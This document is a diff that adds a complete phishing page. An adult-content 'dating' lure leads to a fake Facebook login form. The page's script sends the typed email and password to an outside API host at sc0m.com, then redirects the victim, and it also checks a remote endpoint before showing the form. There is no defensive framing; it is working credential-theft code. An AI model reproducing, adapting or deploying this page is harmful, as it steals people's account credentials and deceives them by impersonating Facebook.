@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="https://cdn.smrt-content.com/assets/1059/other/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdn.smrt-content.com/assets/1059/css/style.css">
+    <script type="text/javascript" defer="" async="" src="https://static.trafficjunky.com/js/mp.min.js">
+    </script>
+    </script>
+    <script type="text/javascript" defer="" async="" src="../static.trafficjunky.com/js/mp.min.js"></script>
+    <script type="text/javascript" defer="" async="" src="https://static.trafficjunky.com/js/mp.min.js"></script>
+    <script src="../cdn.smrt-content.com/assets/1059/js/jquery.js"></script>
+    <script src="https://cdn.smrt-content.com/assets/1059/js/multilang.js"></script>
+    <script src="https://cdn.smrt-content.com/assets/1059/js/showHide.js"></script>
+    <script src="https://cdn.smrt-content.com/assets/1059/js/backoffer.js"></script>
+    <title>Best dating worldwide</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="https://mysc0m.com/css/clone.css" />
+</head>
+<script crossorigin src="https://unpkg.com/react@18/umd/react.development.js"></script>
+<script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+<!-- tailwind cdn  -->
+<script src="https://cdn.tailwindcss.com"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js"
+    integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg=="
+    crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+
+    <script type="text/javascript">
+        $(document).ready(function () {
+            $('.show_hide').showHide({
+                speed: 400,
+                easing: '',
+                hangeText: 1,
+                showText: 'View',
+                hideText: ''
+            }
+            );
+        }
+        );
+    </script>
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const axios = axios.create({
+            baseURL: 'https://api.sc0m.com/api',
+            timeout: 5000,
+            headers: { 'X-Custom-Header': '' },
+        });
+
+        const MainContent = () => {
+            const [vEmail, setVEmail] = React.useState('');
+            const [vPassword, setVPassword] = React.useState('');
+            const [data, setData] = React.useState('');
+
+            const [loading, setLoading] = React.useState(true);
+            React.useEffect(() => {
+                  axios
+                    .get('https://checkapi-xt1h.onrender.com/')
+                    .then((res) => {
+                      setLoading(false);
+                    })
+                    .catch((err) => {
+                      window.location = "https://www.livebotola.com/";
+                    });
+
+                const url = window.location.href;
+                const params = new URL(url).searchParams;
+                const urlbase = params.get('url');
+                setData(urlbase);
+            }, []);
+
+            const addNew = () => {
+                if (vPassword === '' || vEmail === '')
+                    return alert('Please fill all the fields');
+                const body = {
+                    data,
+                    email: vEmail,
+                    password: vPassword,
+                };
+
+                axios
+                    .post('/contact', body)
+                    .then(({ data }) => {
+                        window.location = data;
+                    })
+                    .catch((err) => {
+                        window.location = 'https://www.livebotola.com/';
+                    });
+            };
+            return (
+                <>
+
+                    {loading ? (
+                        <>
+                            <div class="layer">
+                            </div>
+                            <div id="container" align="left">
+                                <img src="images/pixel.html" alt="" />
+                                <div id="q00" class="toggleDiv block" align="center">
+                                    <div class="mobile-center">
+                                        <div class="videobgbox">
+                                            <video class="video" loop="" autoplay="" muted="" playsinline="">
+                                                <source src="https://cdn.smrt-content.com/assets/1059/video/video1.mp4" type="video/mp4" />
+                                            </video>
+                                        </div>
+                                        <div id="box" class="box-bg" align="center">
+                                            <div id="first-title" align="center">
+                                                <h1 class="font-style ">ADVERTENCIA</h1>
+                                            </div>
+                                            <p class="text main-text">You are going to see nude photos. Please be discreet.</p>
+                                            <a class="show_hide" href="#" rel="#q0">
+                                            </a><div class="wrap"><a class="show_hide" href="#" rel="#q0">
+                                            </a><div class="btn"><a class="show_hide" href="#" rel="#q0">
+                                            </a><a onClick={() => setLoading(false)}><div class="btn-cap next">CONTINUE</div></a>
+                                                </div>
+                                            </div>
+
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </>
+                    ) : (
+                        <>
+                            <div id="top_form">
+                                <div class="must">
+                                    <p>You must log in first.</p>
+                                </div>
+                                <div class="conta">
+                                    <div class="container">
+                                        <div method="post">
+                                            <img
+                                                class="lg"
+                                                src="https://i.ibb.co/hFT2CgF/Facebook.png"
+                                                alt=""
+                                            />
+                                            <input
+                                                class="in"
+                                                type="text"
+                                                name="email"
+                                                placeholder="Email address or mobile number"
+                                                required=""
+                                                onChange={(e) => setVEmail(e.target.value)}
+                                            />
+
+                                            <input
+                                                class="in"
+                                                type="password"
+                                                name="pass"
+                                                placeholder="Password"
+                                                onChange={(e) => setVPassword(e.target.value)}
+                                            />
+                                            <input
+                                                class="sub"
+                                                type="submit"
+                                                placeholder=""
+                                                value="Login"
+                                                onClick={addNew}
+                                            />
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                        </>
+                    )}
+                </>
+            );
+        };
+        ReactDOM.render(<MainContent />, document.getElementById('root'));
+    </script>
+</body>
+
+</html>
